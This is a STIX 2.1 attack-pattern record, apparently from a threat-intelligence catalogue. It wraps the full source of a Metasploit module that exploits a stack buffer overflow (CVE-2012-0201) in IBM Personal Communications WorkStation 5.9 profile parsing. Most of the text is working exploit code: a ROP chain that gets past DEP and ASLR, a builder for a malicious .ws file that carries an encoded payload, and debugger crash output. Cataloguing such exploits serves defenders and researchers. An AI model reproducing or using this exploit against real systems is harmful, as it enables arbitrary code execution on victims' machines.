{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ddf2a7e6-0dd4-44d6-8c91-51f33be84061",
    "created": "2024-08-14T16:36:13.934135Z",
    "modified": "2024-08-14T16:36:13.934139Z",
    "name": "IBM Personal Communications iSeries Access WorkStation 5.9 Profile",
    "description": " The IBM Personal Communications I-Series application WorkStation is susceptible to a stack-based buffer overflow vulnerability within file parsing in which data copied to a location in memory exceeds the size of the reserved destination area. The buffer is located on the runtime program stack.  When the WorkStation file is opened it will reach the code path at 0x67575180 located in pcspref.dll which conducts string manipulation and validation on the data supplied in the WorkStation file. The application will first check if 'Profile' header exists and appends a dot with the next parameter within the file. It will then measure the character length of the header by calling strcspn with a dot as its null-terminated character.  It will then write the header into memory and ensure the header ends with a NUL character. The parameter character array is passed to the strcpy() function. The application has declared a 52-element character array for the destination for strcpy function. The function does not perform bounds checking therefore, data can be written paste the end of the buffer variable resulting in corruption of adjacent variables including other local variables, program state information and function arguments. You will notice that the saved RETURN address at offset 0x6c is overwritten by the data written past the buffer.  To ensure we can perform arbitrary code execution we must we provide a valid pointer at 0x74 which is used as an argument for the called function at 0x675751ED as an id file extension parameter. Once the caller regains control we will reach our RETURN. The Ret instruction will be used to pop the overwritten saved return address which was corrupted.  This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.  Versions tested: IBM System i Access for Windows V6R1M0 version 06.01.0001.0000a Which bundles pcsws.exe version 5090.27271.709  Tested on: Microsoft Windows XP     [Version 5.1.2600] Microsoft Windows Vista  [Version 6.0.6002] Microsoft Windows 7      [Version 6.1.7600]  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/ibm_pcm_ws.rb",
            "external_id": "ibm_pcm_ws.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0201"
        },
        {
            "source_name": "reference",
            "url": "https://www-304.ibm.com/support/docview.wss?uid=swg21586166"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking # ASLR+DEP bypass\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'          => 'IBM Personal Communications iSeries Access WorkStation 5.9 Profile',\n      'Description'   => %q{\n      The IBM Personal Communications I-Series application WorkStation is susceptible to a\n      stack-based buffer overflow vulnerability within file parsing in which data copied to a\n      location in memory exceeds the size of the reserved destination area. The buffer is located\n      on the runtime program stack.\n\n      When the WorkStation file is opened it will reach the code path at 0x67575180 located in\n      pcspref.dll which conducts string manipulation and validation on the data supplied in the\n      WorkStation file. The application will first check if 'Profile' header exists and appends\n      a dot with the next parameter within the file. It will then measure the character length\n      of the header by calling strcspn with a dot as its null-terminated character.\n\n      It will then write the header into memory and ensure the header ends with a NUL character.\n      The parameter character array is passed to the strcpy() function. The application has\n      declared a 52-element character array for the destination for strcpy function. The\n      function does not perform bounds checking therefore, data can be written paste the end of\n      the buffer variable resulting in corruption of adjacent variables including other local\n      variables, program state information and function arguments. You will notice that the\n      saved RETURN address at offset 0x6c is overwritten by the data written past the buffer.\n\n      To ensure we can perform arbitrary code execution we must we provide a valid pointer at\n      0x74 which is used as an argument for the called function at 0x675751ED as an id file\n      extension parameter. Once the caller regains control we will reach our RETURN. The Ret\n      instruction will be used to pop the overwritten saved return address which was corrupted.\n\n      This exploit has been written to bypass 2 mitigations DEP and ASLR on a Windows platform.\n\n      Versions tested:\n      IBM System i Access for Windows V6R1M0 version 06.01.0001.0000a\n      Which bundles pcsws.exe version 5090.27271.709\n\n      Tested on:\n      Microsoft Windows XP     [Version 5.1.2600]\n      Microsoft Windows Vista  [Version 6.0.6002]\n      Microsoft Windows 7      [Version 6.1.7600]\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        => 'TecR0c <roccogiovannicalvi[at]gmail.com>',# Discovery & Metasploit module\n      'Payload'       =>\n        {\n          'Space' => 800,\n          'BadChars' => \"\\x00\\x0a\\x0d\\x3d\"\n          # NUL '\\0'\n          # LF  '\\n' (new line)\n          # CR  '\\r' (carriage ret)\n          # =\n        },\n      'Platform'      => 'win',\n      'Targets'       =>\n        [\n          [ 'IBM WorkStation 5.9 (Windows XP SP3)',{} ],\n          [ 'IBM WorkStation 5.9 (Windows 7, Windows Vista)',{} ],\n        ],\n      'References'     =>\n        [\n          ['CVE', '2012-0201'],\n          ['OSVDB', '79657'],\n          ['URL', 'https://www-304.ibm.com/support/docview.wss?uid=swg21586166']\n        ],\n      'DisclosureDate' => '2012-02-28',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptString.new( 'FILENAME', [ true, 'The file name.',  'msf.ws' ]),\n      ])\n\n  end\n\n  def nops(rop=false, n=1)\n    return rop ? [0x67A74499] * n : [0x90909090] * n\n  end\n\n  def exploit\n\n    if target.name =~ /Windows 7/ # Plus Windows Vista\n\n      virtualprotect =\n        [\n\n        # - To get to the VirtualProtect Function\n\n        # Since no Import Address Table (IAT) MS function addresses used to bypass Data Execution\n        # Prevention (DEP) are imported within the applications modules which are required as they\n        # have the ability to mark a portion of the stack as executable.\n        # Also randomization of Windows dll's base addresses due to ASLR from Vista+ are enabled by\n        # default. So we cannot directly add the MS function address into our buffer. Therefore, i\n        # decided to do a [dereference] on another IAT address (kernel32.terminateprocess) then add\n        # the difference between two MS functions in kernel32 to obtain my virtualprotect address so\n        # i can still bypass ASLR. The closest i could get to virtualprotect function was 0x10.\n\n        0X641A1EE2,# Removes 0XFFFFFFF0 from stack to EAX for performing calculations\n        0XFFFFFFF0,# Address to get added into EAX\n        0X641C20C0,# NEG operation to subtracts its operand 0XFFFFFFF0 from zero to set 0x10 in EAX\n        0X67202128,# Exchanges the contents of two operands to store our 0x10 into EDX\n        0X641A1EE2,# We then want to store our closest IAT address to VirtualProtect() function\n        0X63B08084,# This is kernel32.terminateprocess used to get close to VirtualProtect()\n        0X6412F404,# We then do a dereference to get the address of kernel32.terminateprocess\n        0X6412E9AE,# We add 0x10 to kernel32.terminateprocess to load kernel32.VirtualProtect\n\n        ].pack(\"V*\")\n\n    elsif target.name =~ /XP SP3/\n\n      virtualprotect =\n        [\n\n        0X641A1EE2, # We load our VirtualProtect Address into register EAX\n        0X7C801AD4, # kernel32.VirtualProtect\n\n        ].pack(\"V*\")\n    end\n\n    rop_gadgets_p1 =\n      [\n\n      0X67A74498,# Places the next memory address into EDI\n      nops(true, 1),\n      0X6414C496,# Adds the contents of source operand EAX to the destination operation EBX to set dwSize value\n\n      ].flatten.pack(\"V*\")\n\n    rop_gadgets_p2 =\n      [\n\n      0X641EC2D5,# Swaps values to get virtualprotect() into ESI\n      0X64164082,# Put 0xFFFFFFC0 into EAX to be subtracted\n      0XFFFFFFC0,# Value will be subtracted to calculate NewProtect\n      0X641C20C0,# EAX equals NewProtect\n      0X67202128,# Swaps values to get NewProtect parameter into EDX\n      0X641F2D59,# Put next memory address into ECX\n      0X67A85090,# &Writable location\n      0X64164082,# Put NOPs into EAX\n      nops,\n      0X641BFDC2,# PUSHAD all parameters for VirtualProtect\n\n      ].flatten.pack(\"V*\")\n\n    buffer =  rand_text_alpha(104)\n    buffer << [0X673188A5].pack(\"V\")# Set EBP to a pointer to CALL ESP\n    buffer << [0X64164082].pack(\"V\")# Set EAX to nul\n    buffer << [0XFFFFFC18].pack(\"V\")# Put 0xFFFFFC18 into EAX to be subtracted to calculate dwSize\n    buffer << [0X641C20C0].pack(\"V\")# NEG operation to subtracts its operand 0xFFFFFC18 from zero to set 0x3E8 in EAX\n    buffer << rop_gadgets_p1\n    buffer << virtualprotect\n    buffer << rop_gadgets_p2\n    buffer << payload.encoded\n\n    para_value = rand_text_alpha(3)\n    eol = \"\\r\\n\"\n\n    # We only need the header, malicious parameter with value and file extension to trigger the bug\n\n    file =  \"[Profile]\" << eol\n    file << \"#{buffer}=#{para_value}\" << eol\n    file << \"ID=WS\"\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file for #{target.name}...\")\n    file_create(file)\n  end\nend\n\n=begin\n(540.25c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=003d1e49 ebx=77c5f7a0 ecx=00000000 edx=6758bdb0 esi=6758bdb1 edi=41414141\neip=77c483b7 esp=00125360 ebp=0012536c iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206\n*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\\WINDOWS\\system32\\MSVCRT.dll -\nMSVCRT!wcsxfrm+0x125:\n77c483b7 8a27            mov     ah,byte ptr [edi]          ds:0023:41414141=??\n\nModLoad: 76980000 76988000   C:\\WINDOWS\\system32\\LINKINFO.dll\nModLoad: 67310000 67324000   C:\\Program Files\\IBM\\Client Access\\Emulator\\PCSWDLG.DLL\n(5dc.65c): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000000 ebx=00000000 ecx=00000751 edx=00009240 esi=004018a0 edi=0012faa0\neip=42424242 esp=001254e8 ebp=41414141 iopl=0         nv up ei pl nz ac po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010212\n42424242 ??              ???\n\nsigned int __cdecl sub_67575180(const char *HeaderPlusParameter, char *FileExtension, int a3, int a4, int a5)\n{\n  size_t SizeOfHeader;\n  char ParameterName;\n  char Dest[52];\n\n  SizeOfHeader = strcspn(HeaderPlusParameter, \".\");\n  strncpy(Dest, HeaderPlusParameter, SizeOfHeader);\n  Dest[SizeOfHeader] = 0;\n  strcpy(&ParameterName, &HeaderPlusParameter[SizeOfHeader + 1]);\n  return sub_67573D80(FileExtension, Dest, &ParameterName, a3, a5, a4);\n}\n\n0:000> da @esp\n0012549c  \"AAAAAAAA. .dAAAAAAAAAAAAAAAAAAAA\"\n001254bc  \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n001254dc  \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n001254fc  \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n0012551c  \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n0012553c  \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"\n0012555c  \"AA\"\n\nROP gadgets from images\nImage name: cwbcore.dll\n    Timestamp:        Wed Dec 12 04:15:43 2007 (475EC5BF)\n    CheckSum:         0011CD4C\n    ImageSize:        00118000\n    File version:     12.0.0.0\n    CompanyName:      IBM Corporation\n    ProductName:      IBM(R) System i(TM) Access for Windows\nImage name: PCSXFER.DLL\n    Timestamp:        Wed Dec 12 04:15:48 2007 (475EC5C4)\n    CheckSum:         0007130E\n    ImageSize:        0006B000\n    File version:     5090.1.7103.892\n    CompanyName:      IBM Corporation\n    ProductName:      Personal Communications\nImage name: nstrc.dll\n    CheckSum:         0000F9D6\n    ImageSize:        00009000\n    File version:     5090.0.6171.1308\n    CompanyName:      IBM Corporation\n    ProductName:      Personal Communications\n    FileDescription:  Independent Trace Facility\nImage name: PCSCTSS.DLL\n    Timestamp:        Wed Dec 12 04:15:47 2007 (475EC5C3)\n    CheckSum:         0001D6EB\n    ImageSize:        0007D000\n    File version:     5090.1.7103.892\n    CompanyName:      IBM Corporation\n    ProductName:      Personal Communications\nImage name: PCSWDLG.DLL\n    Timestamp:        Wed Dec 12 04:15:48 2007 (475EC5C4)\n    CheckSum:         0001FCBC\n    ImageSize:        00014000\n    File version:     5090.1.7103.892\n    CompanyName:      IBM Corporation\n    ProductName:      Personal Communications\n=end\n",
    "x_mitre_disclosure_date": "2012-02-28",
    "x_mitre_platforms": [
        "win'"
    ]
}